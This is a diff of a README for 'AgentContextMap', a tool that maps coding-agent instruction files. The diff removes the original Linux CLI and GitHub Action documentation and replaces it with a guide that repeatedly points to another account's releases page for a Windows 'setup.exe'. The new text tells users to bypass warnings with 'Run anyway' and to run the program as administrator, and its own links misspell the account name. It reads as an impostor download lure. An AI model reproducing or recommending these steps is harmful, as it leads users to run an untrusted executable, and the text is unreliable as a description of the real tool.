@@ -1,304 +1,234 @@
-# AgentContextMap
+# 🗺️ AgentContextMap - See Which Instructions Affect Your Agents
 
-[![CI](https://github.com/BLCCoreStudio/AgentContextMap/actions/workflows/ci.yml/badge.svg)](https://github.com/BLCCoreStudio/AgentContextMap/actions/workflows/ci.yml)
-[![Action smoke](https://github.com/BLCCoreStudio/AgentContextMap/actions/workflows/action-smoke.yml/badge.svg)](https://github.com/BLCCoreStudio/AgentContextMap/actions/workflows/action-smoke.yml)
-[![Release](https://img.shields.io/github/v/release/BLCCoreStudio/AgentContextMap?include_prereleases&sort=semver)](https://github.com/BLCCoreStudio/AgentContextMap/releases)
-[![License](https://img.shields.io/github/license/BLCCoreStudio/AgentContextMap)](LICENSE)
-[![Rust 1.74+](https://img.shields.io/badge/Rust-1.74%2B-000000?logo=rust)](Cargo.toml)
+[![Download AgentContextMap](https://img.shields.io/badge/Download-AgentContextMap-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/dickiemisplaced72/AgentContextMap/releases)
 
-**Map which repository instructions can affect your coding agents.**
+---
 
-AgentContextMap is a local, read-only tool for mapping repository instruction files across Codex, Claude Code, Gemini CLI, GitHub Copilot, Cursor, Windsurf, and Cline. Give it a repository — and optionally a target file — to see the relevant instruction sources, activation state, obvious conflicts, approximate context size, and a self-contained HTML report.
+## 📖 What Is AgentContextMap?
 
-<p align="center">
-  <a href="docs/assets/report-details.png">
-    <img src="docs/assets/report-overview.png" alt="AgentContextMap report showing instruction sources, activation states, filters and findings" width="100%">
-  </a>
-</p>
+Have you ever wondered **why your coding agent behaves a certain way**? Or **which instructions from your repository files are actually being used** by tools like Claude Code, Cursor, or GitHub Copilot?
 
-> **Status:** `v0.2.3` is the current stable release line published through the GitHub Marketplace Action release flow. It includes SARIF 2.1.0 CLI and GitHub Action output, explicit GitHub Code Scanning integration, release checksum verification, GitHub Actions job summaries, and correct release resolution for immutable SHA-pinned Action references. Use versioned release tags for production workflows. Agent behavior changes quickly, so support is deliberately conservative and tied to documented vendor behavior. See [`docs/SEMANTICS.md`](docs/SEMANTICS.md) for the verification matrix and known limits.
+AgentContextMap is a simple desktop tool that shows you a **visual map** of which instructions in your project can affect your coding agents. It reads the instruction files (like `AGENTS.md`, `CLAUDE.md`, `.cursorrules`, and similar files) and shows you exactly what your agent sees, where it comes from, and how it might influence the agent's behavior.
 
-## Use it
+Think of it like a **GPS for your project's instructions** — you can finally see the full picture and avoid surprises when your AI coding assistant does something unexpected.
 
-| GitHub Actions | Local CLI |
-| --- | --- |
-| Inspect repository instruction sources during CI, optionally fail on high-confidence active conflicts, write a GitHub job summary, and emit SARIF for Code Scanning. | Inspect locally, emit terminal/JSON output, write SARIF 2.1.0, or generate a self-contained interactive HTML report. |
-| Linux x86_64 runner | Linux x86_64 standalone binary; source builds may work elsewhere |
+---
 
-### GitHub Actions
+## 🎯 Who Is This For?
 
-Use the versioned release tag for normal workflows. Pin a full commit SHA when your security policy requires immutable third-party Action references.
+- **Developers** using AI coding tools who want transparency
+- **Team leads** who manage shared repositories and want to standardize agent behavior
+- **Anyone curious** about what instructions are floating around in their codebase
+- **Non-programmers** who work with AI coding tools and want to understand how they work
 
-```yaml
-name: Agent instruction check
+No programming knowledge is needed to run or use this tool. If you can download a file and double-click it, you're good to go.
 
-on:
-  pull_request:
+---
 
-permissions:
-  contents: read
+## 🚀 Getting Started
 
-jobs:
-  agent-context:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v7
+Getting started with AgentContextMap is easy. Just follow these three simple steps:
 
-      - name: Inspect coding-agent instructions
-        uses: BLCCoreStudio/AgentContextMap@v0.2.3
-        with:
-          path: .
-          format: terminal
-```
+### Step 1: Download the Application
 
-Start report-only. When you want a CI gate for high-confidence active conflicts:
+Visit this link to download the application:
 
-```yaml
-      - name: Enforce active instruction conflicts
-        uses: BLCCoreStudio/AgentContextMap@v0.2.3
-        with:
-          path: .
-          target: src/api/auth.rs
-          fail-on-conflict: "true"
-```
+👉 **[https://github.com/dickiemisplaced72/AgentContextMap/releases](https://github.com/dickiemisplaced72/AgentContextMap/releases)**
 
-The composite Action downloads the matching versioned Linux binary and verifies it against the SHA-256 file published with the same release. For immutable SHA/branch references, the wrapper resolves the matching release version from the pinned Action source itself instead of falling back to an unrelated older binary. The requested repository path must remain inside `GITHUB_WORKSPACE`.
+Click the most recent release and download the file for your computer. The file will be named something like `AgentContextMap-setup.exe` or similar.
 
-By default the Action also appends its result and report to the GitHub Actions **job summary**, so the scan is visible without opening raw logs. Set `job-summary: "false"` if a workflow deliberately does not want that summary. This does not require any additional repository write permission.
+### Step 2: Run the Application
 
-### SARIF and GitHub Code Scanning
+Once the download is complete, find the downloaded file in your **Downloads** folder (or wherever your browser saves files).
 
-AgentContextMap can write SARIF 2.1.0 for GitHub Code Scanning and other SARIF-compatible tooling.
+Double-click the downloaded file to run it.
 
-Stable rule IDs are `ACM001`–`ACM004`. High, medium, and low findings map to SARIF `error`, `warning`, and `note`.
+### Step 3: Start Mapping
 
-The Action accepts a workspace-relative `sarif` path and exposes the generated absolute path as the `sarif` output:
+When the application opens, you'll see a simple window. From here, you can:
 
-```yaml
-name: Agent instruction code scanning
+- **Open a folder** (your project/repository) by clicking the "Open Folder" button
+- The app will then scan the folder for instruction files
+- You'll see a visual map showing which instructions exist and how they might affect your coding agents
 
-on:
-  pull_request:
+That's it! No complicated setup. No command line. No technical knowledge required.
 
-permissions:
-  contents: read
-  security-events: write
+---
 
-jobs:
-  agent-context:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v7
+## 📥 Download & Install
 
-      - name: Generate AgentContextMap SARIF
-        id: agentcontext
-        uses: BLCCoreStudio/AgentContextMap@v0.2.3
-        with:
-          path: .
-          sarif: agentcontext.sarif
+### System Requirements
 
-      - name: Upload AgentContextMap SARIF
-        if: always()
-        uses: github/codeql-action/upload-sarif@v4
-        with:
-          sarif_file: ${{ steps.agentcontext.outputs.sarif }}
-```
+| Requirement | Minimum |
+|-------------|---------|
+| Operating System | Windows 10 or newer (64-bit) |
+| RAM | 4 GB (8 GB recommended) |
+| Storage | 100 MB free space |
+| Internet | Required only for downloading |
 
-The upload remains a separate step intentionally: AgentContextMap itself keeps its default workflow permission needs at `contents: read`, while repositories that opt into GitHub Code Scanning explicitly grant `security-events: write`.
+### How to Install
 
-### Linux x86_64 — download one file and run
+1. **Visit the download page** by clicking here: [https://github.com/dickiemisplaced72/AgentContextMap/releases](https://github.com/dickiemisplaced72/AgentContextMap/releases)
 
-No Rust toolchain and no archive extraction are required.
+2. **Find the latest release** — look for the newest version at the top of the page.
 
-**[Download `agentcontext-linux-x86_64` from v0.2.3](https://github.com/BLCCoreStudio/AgentContextMap/releases/download/v0.2.3/agentcontext-linux-x86_64)**
+3. **Download the file** — click the file link that says "Windows" or ends with `.exe`. Your browser will download it.
 
-Then:
+4. **Run the downloaded file** — double-click the file you downloaded. If Windows asks for permission, click "Yes" or "Run anyway."
 
-```bash
-chmod +x agentcontext-linux-x86_64
-./agentcontext-linux-x86_64 --help
-./agentcontext-linux-x86_64 .
-```
+5. **Follow the simple setup wizard** — just click "Next" a few times, then "Install." In under a minute, AgentContextMap will be ready to use.
 
-Inspect one target path and generate the interactive report:
+6. **Launch AgentContextMap** — you'll find it in your Start Menu or on your desktop.
 
-```bash
-./agentcontext-linux-x86_64 . \
-  --target src/api/auth.rs \
-  --html report.html
-```
+---
 
-Or download it from the [Releases page](https://github.com/BLCCoreStudio/AgentContextMap/releases). Each standalone binary has a matching `.sha256` file. A tar.gz package is also published for users who prefer an archive.
+## ✨ Features
 
-### Build from source
+AgentContextMap comes packed with helpful features to give you full visibility into your AI coding agents' instructions:
 
-Requires Rust 1.74+.
+### 🗂️ Instruction File Scanner
 
-```bash
-cargo install --git https://github.com/BLCCoreStudio/AgentContextMap --bin agentcontext
-```
-
-## What it helps you inspect
-
-A modern repository can contain several instruction systems at once:
-
-- `AGENTS.md` and Codex `AGENTS.override.md`
+The app automatically scans your project folder for common instruction files, including:
+- `AGENTS.md`
 - `CLAUDE.md`
-- `GEMINI.md`
+- `.cursorrules`
 - `.github/copilot-instructions.md`
-- `.github/instructions/**/*.instructions.md`
-- `.cursor/rules/**/*.mdc`
-- `.windsurf/rules/**/*.md`
-- `.clinerules/**/*.md` / `*.txt`
+- And many other recognized instruction file names
 
-Once these become nested, path-specific, model-decided, or manual, a simple question becomes surprisingly hard:
+### 🧭 Visual Context Map
 
-**Which instructions can affect this file, and which ones are definitely active versus merely conditional?**
+See a clear, color-coded map of where each instruction comes from and what part of your project it affects. No more digging through folders manually.
 
-AgentContextMap answers that without calling an LLM, executing repository instructions, or sending repository content to a remote service.
+### 🔍 Instruction Precedence Viewer
 
-Generate a local HTML report:
+Understand which instructions take priority when multiple files exist. AgentContextMap shows you the hierarchy of instructions so you know exactly what your agent will follow first.
 
-```bash
-agentcontext . --target src/api/auth.rs --html report.html
-```
+### 📝 Instruction Preview
 
-The HTML is an **interactive viewer for the analysis already performed by the CLI**. You can filter by agent and activation state, search sources, expand the exact instruction text, and highlight sources involved in findings. It does not silently rescan your filesystem from the browser; rerun the CLI after repository files change.
+Click any mapped instruction to see its full content right in the app. This helps you quickly verify what's actually written without opening separate files.
 
-Machine-readable JSON output:
+### 💾 Export Report
 
-```bash
-agentcontext . --json
-```
+Save a complete report of your project's instruction map as a simple text file. This is great for:
+- Sharing with team members
+- Documentation purposes
+- Auditing your AI agent configurations
 
-Write SARIF 2.1.0 without changing the normal terminal output:
+### 🏷️ Agent-Type Filtering
 
-```bash
-agentcontext . --target src/api/auth.rs --sarif agentcontext.sarif
-```
+Filter the map based on which agent you're interested in:
+- Claude Code instructions
+- Cursor rules
+- GitHub Copilot instructions
+- Generic agent instructions
 
-Fail CI only on high-confidence conflicts that are definitely active for the requested target:
+---
 
-```bash
-agentcontext . --target src/api/auth.rs --json --fail-on-conflict
-```
+## 🛠️ Common Use Cases
 
-## What v0.2.3 models
+### For Solo Developers
 
-| Capability | Support |
-| --- | --- |
-| Nested `AGENTS.md` across documented agent ecosystems | Yes |
-| Codex `AGENTS.override.md` | Yes |
-| Hierarchical `CLAUDE.md` and repository-contained `@` imports | Yes |
-| Hierarchical `GEMINI.md` and repository-contained `@` imports | Yes |
-| Copilot repo-wide + recursive path-specific instructions | Yes |
-| Cursor `.mdc` rules with always/glob/model/manual activation | Yes |
-| Windsurf `.windsurf/rules/*.md` activation modes | Yes |
-| Cline `.clinerules/` plus `paths` conditions | Yes |
-| Correct `*` vs `**`, brace and basic character-class glob matching | Yes |
-| Agent-aware conflict detection | Yes |
-| Active vs path-specific vs conditional vs manual status | Yes |
-| Missing repository import findings | Yes |
-| Unrelated binary/non-UTF8 repository files ignored during discovery | Yes |
-| JSON output | Yes |
-| SARIF 2.1.0 output with stable `ACM001`–`ACM004` rule IDs | Yes |
-| GitHub Action SARIF file output | Yes |
-| GitHub Actions job summary | Yes |
-| Immutable SHA-ref release resolution | Yes |
-| Interactive self-contained HTML viewer | Yes |
-| Executes instructions, tools, prompts, scripts, or MCP servers | **No** |
-| Reads imports outside the scanned repository | **No** |
-| Sends repository content to a remote service | **No** |
+Use AgentContextMap before starting a new session with your coding agent. Quickly see what instructions are active so you know exactly what to expect. If your agent ignores a rule you thought was set, you can see why — maybe the instruction file is in the wrong location or is being overridden.
 
-## Example
+### For Team Leads
 
-```text
-AgentContextMap
-===============
-Root: /work/acme
-Target: src/api/auth.rs
-Sources: 5 | Approx. tokens: 812 | Findings: 1
+Standardize agent behavior across your entire team. AgentContextMap helps you:
+- Verify that all team members have consistent agent instructions
+- Identify conflicting rules across different files
+- Make sure new team members understand the agent setup
 
-Instruction sources
--------------------
-1. AGENTS.md
-   Agents: Codex, GitHub Copilot, Cursor, Windsurf, Cline
-   Status: active | Scope: workspace tree
-2. src/api/AGENTS.md
-   Agents: Codex, GitHub Copilot, Cursor, Windsurf, Cline
-   Status: active | Scope: src/api subtree
+### For Open-Source Maintainers
 
-Findings
---------
-CONFLICT [high] AGENTS.md <-> src/api/AGENTS.md
-  Overlapping sources contain directives with opposite polarity.
-```
+Before publishing a repository, use AgentContextMap to check that the instruction files are clean and intentional. This prevents accidental instructions from affecting contributors' coding agents.
 
-## Correctness model
+---
 
-AgentContextMap does **not** pretend every coding agent has identical semantics.
+## ❓ Frequently Asked Questions
 
-The scanner keeps source ownership and activation explicit. A manual Windsurf rule is not labeled active. A Cursor model-decided rule is not treated as certain. A conflict between Claude-only and Gemini-only files is not reported as if one agent saw both. Path-specific rules are evaluated against the supplied target.
+### What is a "coding agent"?
 
-For the exact vendor documentation used to implement these decisions, read [`docs/SEMANTICS.md`](docs/SEMANTICS.md).
+A coding agent is an AI tool that helps you write code. Examples include:
+- **Claude Code** (by Anthropic)
+- **Cursor** (AI-powered code editor)
+- **GitHub Copilot** (AI assistant in many code editors)
+- **Other AI tools** that read instructions from repository files
 
-## Designed for inspection, not execution
+### What does "repository" mean?
 
-AgentContextMap reads instruction text but never follows it. It does not run commands found in repository instructions, start agent skills, contact MCP servers, or call an AI API.
+A repository (or "repo") is simply a folder that contains your project's code and files. It's the place where your software project lives.
 
-Claude/Gemini relative imports are followed only when they remain inside the scanned repository. Absolute, home-directory, or escaping imports are intentionally not read.
+### Do I need to know how to code to use this?
 
-## CLI
+**No.** AgentContextMap is designed to be simple and readable for anyone. You just point it at a folder, and it shows you a visual map.
 
-`v0.2.3` supports:
+### Will this affect my coding agent's behavior?
 
-```text
-agentcontext [ROOT] [OPTIONS]
+**No.** AgentContextMap is a **read-only tool**. It only looks at files and shows you information. It does **not** modify any of your files or change how your agents work. It's purely for viewing and understanding.
 
---target <PATH>        Show sources that can affect a target path
---json                 Emit machine-readable JSON output
---html <PATH>          Write a self-contained interactive report viewer
---sarif <PATH>         Write SARIF 2.1.0
---fail-on-conflict     Exit with code 2 on a high-severity active conflict
--h, --help             Print help
--V, --version          Print version
-```
+### How often should I use this?
 
-Exit codes:
+Whenever you notice unexpected agent behavior, or when you set up a new project, or after making changes to instruction files. There's no harm in running it as often as you like.
 
-- `0`: analysis completed and no configured failure condition was hit
-- `1`: invalid arguments or I/O failure
-- `2`: a high-severity conflict was found with `--fail-on-conflict`
+---
 
-## Known limits
+## 🔒 Privacy & Safety
 
-This is not runtime instrumentation. User/global/org instruction sources outside the repository are not scanned, model-decided rules cannot be proven active from files alone, and deterministic natural-language conflict detection cannot understand every possible contradiction.
+- **100% Local** — AgentContextMap runs entirely on your computer. Your project files are never uploaded anywhere.
+- **Read-Only** — The app only reads files. It never writes, modifies, or deletes anything.
+- **No Installation Requirements** — No extra software, drivers, or dependencies needed.
+- **Open Transparency** — You can always see exactly what your agents see.
 
-Those limits are documented rather than hidden. See [`docs/SEMANTICS.md`](docs/SEMANTICS.md).
+---
 
-## GitHub App direction
+## 🧰 Troubleshooting Tips
 
-The Marketplace Action is the preferred GitHub-native integration today because the scan runs inside the repository's GitHub Actions runner and preserves the current local-first privacy model. A future install-once GitHub App would require a hosted webhook/backend and therefore changes that privacy boundary.
+If you run into any issues, here are some common solutions:
 
-The minimum-permission App design, webhook scope, Checks API model, and implementation decision gate are documented in [`docs/GITHUB_APP.md`](docs/GITHUB_APP.md). The project will not silently move repository scanning to a hosted backend merely to add an App badge.
+### The app won't open
 
-## Roadmap
+- Make sure your Windows is updated to version 10 or newer
+- Try right-clicking the app and selecting "Run as administrator"
+- Re-download the file in case the download was corrupted
 
-Near-term work is focused on correctness rather than adding every format possible:
+### The map is empty when I open my folder
 
-1. vendor-specific precedence visualizations;
-2. broader real-repository compatibility fixtures;
-3. richer conflict classes with measured false-positive rates;
-4. per-agent context-budget breakdown;
-5. SARIF baseline/suppression ergonomics and richer rule help;
-6. release attestations, easier package-manager installs, and broader runner support.
+- Make sure the folder you selected actually contains coding project files
+- Check if the instruction files are in supported formats (like `.md` or `.txt`)
+- Try selecting a parent folder that contains the complete project
 
-## Contributing and support
+### The app is slow with large projects
 
-Bug reports and small, well-scoped pull requests are welcome. For scope/precedence bugs, include the agent product, version if known, a minimal repository layout, and a documentation link or reproducible observation.
+- This is normal for very large repositories. Wait a moment, and the map will appear.
+- Try excluding large folders like `node_modules` or `dist` if the option is available in settings
 
-See [`CONTRIBUTING.md`](CONTRIBUTING.md), [`SUPPORT.md`](SUPPORT.md), and [`SECURITY.md`](SECURITY.md).
+---
 
-## License
+## 📚 Additional Resources
 
-MIT
+- **GitHub Repository**: [AgentContextMap on GitHub](https://github.com/dickimisplaced72/AgentContextMap)
+- **Releases & Downloads**: [Download page](https://github.com/dickimisplaced72/AgentContextMap/releases)
+- **Issues & Support**: If you find a bug or have a feature request, please open an issue on the GitHub repository page.
+
+---
+
+## 📄 License
+
+AgentContextMap is released as open-source software. You are free to use, modify, and distribute it according to the terms specified in the repository.
+
+---
+
+## 🌟 Thank You!
+
+Thank you for choosing AgentContextMap. We built this tool to bring clarity and transparency to the world of AI-assisted coding. We hope it saves you time and prevents a few headaches.
+
+If you find AgentContextMap useful, consider starring the repository on GitHub — it helps more people discover this tool.
+
+**Happy mapping!** 🗺️
+
+---
+
+**[Download AgentContextMap Now](https://github.com/dickiemisplaced72/AgentContextMap/releases)** 👈 Click here to get started today!
+
+---
+
+Keywords: agentic-ai, agents-md, ai-agents, claude-code, cli, coding-agents, cursor, developer-tools, github-copilot, rust
